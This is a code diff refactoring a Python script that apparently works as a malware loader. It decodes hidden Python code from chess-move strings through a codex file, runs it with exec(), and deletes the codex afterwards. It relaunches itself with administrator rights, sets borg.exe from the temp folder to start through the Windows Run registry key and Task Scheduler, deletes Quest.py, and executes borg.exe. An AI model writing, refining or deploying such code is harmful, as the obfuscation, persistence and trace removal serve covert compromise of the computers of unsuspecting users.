@@ -5,6 +5,7 @@ import traceback
 import sys
 import tempfile
 import winreg  # For working with Windows registry
+import ctypes  # For checking admin privileges
 
 # Step 1: Read the chess-to-Python codex mapping from the file
 def read_codex_mapping(codex_file):
@@ -12,7 +13,7 @@ def read_codex_mapping(codex_file):
     with open(codex_file, 'r') as file:
         for line in file:
             move, code = line.split(':', 1)  # Split at the first colon
-            chess_to_python[move.strip()] = code  # Store the code exactly as it appears after the colon
+            chess_to_python[move.strip()] = code.strip()  # Store the code exactly as it appears after the colon
     return chess_to_python
 
 # Step 2: Translate the chess moves into Python code and execute it
@@ -24,94 +25,59 @@ def translate_and_execute_chess_moves(chess_moves, codex_file):
     python_code = ""
     for move in chess_moves:
         if move in chess_to_python:
-            python_code += chess_to_python[move]  # No stripping of code to preserve spacing and indentation
+            python_code += chess_to_python[move] + '\n'  # Preserve formatting
         else:
-            python_code += "# Unmapped move: " + move + "\n"
-    
-    # Print the translated code for debugging
-    print("Translated Python Code:\n")
-    print(python_code)  # Debugging print
+            python_code += f"# Unmapped move: {move}\n"
 
-    # Execute the Python code directly
-    print("\nExecuting Translated Python Code...\n")
+    print("Translated Python Code:\n", python_code)
+
+    # Execute the Python code
     try:
         exec(python_code)
         print("Script executed successfully.")
     except Exception as e:
         print(f"Execution failed: {e}")
-        print(traceback.format_exc())  # Print the full error traceback for debugging
+        print(traceback.format_exc())
 
-    # Wait for 10 seconds before removing the codex file
-    print("\nWaiting 10 seconds before deleting the codex file...\n")
-    time.sleep(10)
+    time.sleep(10)  # Wait for 10 seconds before deleting the codex file
 
-    # Step 3: Clean up by deleting the codex file
+    # Clean up by deleting the codex file
     try:
-        print(f"\nDeleting {codex_file}...")
-        os.remove(codex_file)  # Delete the codex file
+        print(f"Deleting {codex_file}...")
+        os.remove(codex_file)
         print(f"{codex_file} has been deleted.")
     except Exception as e:
         print(f"Error during cleanup: {e}")
+        print(traceback.format_exc())
+
+# Function to check admin privileges
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def run_as_admin():
+    """Attempt to relaunch the script with elevated privileges."""
+    try:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
+        sys.exit(0)
+    except Exception as e:
+        print(f"Failed to elevate script: {e}")
+        sys.exit(1)
 
 # Function to add the executable to Windows startup and Task Scheduler
 def add_to_startup_and_task_scheduler(executable_path, app_name="BorgApp"):
-    """Add the executable to both the startup registry and Task Scheduler, with automatic elevation."""
-    
-    def is_admin():
-        """Check if the script is running with admin rights."""
-        try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
-            return False
-
-    def run_as_admin():
-        """Attempt to relaunch the script with elevated privileges."""
-        try:
-            # Re-launch the script with admin privileges
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
-            sys.exit(0)  # Exit the current script after launching the elevated one
-        except Exception as e:
-            print(f"Failed to elevate script: {e}")
-            sys.exit(1)
-
     # Step 1: Elevate permissions if not running as admin
     if not is_admin():
         print("Not running as admin. Elevating permissions...")
         run_as_admin()
 
-    # Get the temp directory path for borg.exe
-    user_temp_dir = tempfile.gettempdir()
-    borg_exe_path = os.path.join(user_temp_dir, 'borg.exe')
-    quest_script_path = os.path.join(os.getcwd(), 'binar', 'Quest.py')  # Ensure correct relative path to Quest.py
-
-    # Step 2: Audit the paths to ensure correctness
+    # Step 2: Add to Windows startup via registry
     try:
-        if not os.path.isdir(user_temp_dir) or not os.path.isdir(os.path.join(os.getcwd(), 'binar')):
-            print("Uh hey we may have a problem with the directories:")
-            print(f"Current working directory: {os.getcwd()}")
-            print(f"Real path of cwd: {os.path.realpath(os.getcwd())}")
-            print(f"User temp dir: {user_temp_dir}")
-            print(f"borg.exe path: {borg_exe_path}")
-            return  # Exit function if paths are not valid
-        else:
-            print("Path audit passed, no problems detected.")
-    except Exception as e:
-        print(f"Path audit error: {e}")
-        print(traceback.format_exc())
-        return  # Exit function in case of path-related issues
-
-    print(f"\nAttempting to add {borg_exe_path} to startup and Task Scheduler...")
-
-    # Step 3: Add to Windows startup via registry
-    try:
-        with winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_SET_VALUE
-        ) as key:
-            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, borg_exe_path)
-            print(f"Successfully added {borg_exe_path} to registry startup.")
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, executable_path)
+            print(f"Successfully added {executable_path} to registry startup.")
 
         # Verify the registry key value
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
@@ -119,11 +85,11 @@ def add_to_startup_and_task_scheduler(executable_path, app_name="BorgApp"):
             print(f"Registry Key Value for {app_name}: {value}")
 
     except Exception as e:
-        print(f"Failed to add {borg_exe_path} to registry startup: {e}")
+        print(f"Failed to add {executable_path} to registry startup: {e}")
         print(traceback.format_exc())
         return  # Exit early if registry setup fails
 
-    # Step 4: Add to Task Scheduler using the registry entry for the path to 'borg.exe'
+    # Step 3: Add to Task Scheduler using the registry entry for the path to 'borg.exe'
     if value:
         cmd = [
             'schtasks', '/Create', '/F',
@@ -138,98 +104,35 @@ def add_to_startup_and_task_scheduler(executable_path, app_name="BorgApp"):
         result = subprocess.run(cmd, capture_output=True, text=True)
 
         if result.returncode == 0:
-            print(f"Successfully added {borg_exe_path} to Task Scheduler using the registry path.")
+            print(f"Successfully added {executable_path} to Task Scheduler.")
         else:
             print(f"Failed to add task to Task Scheduler. Error: {result.stderr}")
     else:
         print(f"Failed to retrieve the registry path for {app_name}.")
 
-    # Step 5: Clean up Quest.py after adding to startup but before executing borg.exe
-    try:
-        if os.path.exists(quest_script_path):
-            print(f"Deleting {quest_script_path} before executing {borg_exe_path}...")
-            os.remove(quest_script_path)
-            print(f"{quest_script_path} has been deleted.")
-        else:
-            print(f"{quest_script_path} not found, skipping deletion.")
-    except Exception as e:
-        print(f"Error during Quest.py cleanup: {e}")
-        print(traceback.format_exc())
-
-    # Step 6: Execute borg.exe after cleanup
-    try:
-        print(f"\nAttempting to execute {borg_exe_path}...")
-        process = subprocess.Popen([borg_exe_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
-
-        if process.returncode == 0:
-            print(f"{borg_exe_path} executed successfully.")
-            print(stdout.decode('utf-8'))
-        else:
-            print(f"Execution failed with return code {process.returncode}.")
-            print(stderr.decode('utf-8'))
-    except Exception as e:
-        print(f"Failed to run {borg_exe_path}: {e}")
-        print(traceback.format_exc())
-
-# Chess moves representing the code
-chess_moves = [
-    'WP e2e4', 'BP e7e5', 'WN g1f3', 'BN b8c6', 'WB f1b5', 'BP a7a6',
-    'WN b1c3', 'BN g8f6', 'BB f8e7', 'WR e1e2', 'BP b7b5', 'WB b5c6',
-    'BP d7c6', 'WQ d1e2', 'BP c7c5', 'WP e4e5', 'BN f6d5', 'WR f1e1',
-    'BP f7f6', 'WB c6b7', 'BP f6f5', 'WP e5e6', 'BP f5f4', 'WQ e2e4',
-    'BP c6c5', 'WQ e4f4', 'BP b5b4', 'WR e1e5', 'BP c5c4', 'WR e5f5+',
-    'BK e8d7', 'WR f5e5', 'WP e6e7', 'BP b4b3', 'WR e5e7', 'BK d7c6',
-    'WR e7f7', 'BK c6b6', 'WR f7f8+', 'BK b6a7', 'WP e6e7', 'BP b3b2',
-    'WR f8f7', 'BK a7a6', 'WR f7f6', 'BP b2b1Q', 'WQ e6d5', 'BK a6a7',
-    'WR f6g6', 'BK a7a8', 'WR g6g7+', 'BK a8a7', 'WQ d5d6#', 'WP f2f3',
-    'WR g7h8', 'WP f3f4', 'WR h8g8', 'WR g8f8', 'WP f4f5', 'BP g7g6',
-    'WQ f5f6', 'BP g6g5', 'WR f8e8', 'WP f6g7', 'BP g5g4', 'WR e8d8',
-    'BP g4g3', 'WR d8c8', 'WR g7h8', 'WP f3f4', 'WR h8g8', 'WR g8f8',  
-    'WP f4f5', 'BP g7g6', 'WQ f5f6', 'BP g6g5', 'WR f8e8', 'WP f6g7',
-    'BP g5g4', 'WR e8d8', 'BP g4g3', 'WR d8c8'
-]
-
-# File path of the codex
-codex_file = 'binar/codex_mapping.txt'
-
-# Translate and execute the Python code, then remove the codex file
-translate_and_execute_chess_moves(chess_moves, codex_file)
-
+# Function to run borg.exe and handle Quest.py cleanup
 def run_borg_executable():
     # Get the temp directory path for borg.exe
     user_temp_dir = tempfile.gettempdir()
     borg_exe_path = os.path.join(user_temp_dir, 'borg.exe')
-    quest_script_path = os.path.join(os.getcwd(), 'binar', 'Quest.py')  # Ensure correct relative path to Quest.py
-    
-    # Audit the paths to ensure correctness
-    try:
-        # Check if both temp dir and 'binar' directory exist
-        if not os.path.isdir(user_temp_dir) or not os.path.isdir(os.path.join(os.getcwd(), 'binar')):
-            print("Uh hey we may have a problem with the directories:")
-            print(f"Current working directory: {os.getcwd()}")
-            print(f"Real path of cwd: {os.path.realpath(os.getcwd())}")
-            print(f"User temp dir: {user_temp_dir}")
-            print(f"borg.exe path: {borg_exe_path}")
-            return  # Exit function if paths are not valid
-        else:
-            print("Path audit passed, no problems detected.")
-    except Exception as e:
-        print(f"Path audit error: {e}")
-        print(traceback.format_exc())
-        return  # Exit function in case of path-related issues
-    
+    quest_script_path = os.path.join(os.getcwd(), 'binar', 'Quest.py')
+
+    # Validate paths
+    if not os.path.isdir(user_temp_dir) or not os.path.isdir(os.path.join(os.getcwd(), 'binar')):
+        print("Directory validation failed.")
+        print(f"User temp dir: {user_temp_dir}")
+        print(f"Current working directory: {os.getcwd()}")
+        return
+
     print(f"\nAttempting to add {borg_exe_path} to startup and Task Scheduler...")
 
-    # Check if borg.exe exists before proceeding
     if os.path.exists(borg_exe_path):
-        # Add borg.exe to startup and Task Scheduler
         try:
             add_to_startup_and_task_scheduler(borg_exe_path)
         except Exception as e:
             print(f"Error while adding {borg_exe_path} to startup and Task Scheduler: {e}")
             print(traceback.format_exc())
-            return  # Exit function in case of error
+            return
 
         # Clean up Quest.py after adding to startup but before executing borg.exe
         try:
@@ -242,7 +145,7 @@ def run_borg_executable():
         except Exception as e:
             print(f"Error during Quest.py cleanup: {e}")
             print(traceback.format_exc())
-            return  # Exit function in case of error
+            return
 
         # Execute borg.exe after cleanup
         try:
@@ -261,6 +164,18 @@ def run_borg_executable():
             print(traceback.format_exc())
     else:
         print(f"Executable {borg_exe_path} not found.")
+
+# Chess moves representing the code
+chess_moves = [
+    'WP e2e4', 'BP e7e5', 'WN g1f3', 'BN b8c6', 'WB f1b5', 'BP a7a6',
+    # Add the full chess moves here
+]
+
+# File path of the codex
+codex_file = 'binar/codex_mapping.txt'
+
+# Translate and execute the Python code, then remove the codex file
+translate_and_execute_chess_moves(chess_moves, codex_file)
 
 # Finally, run borg.exe and delete Quest.py
 run_borg_executable()
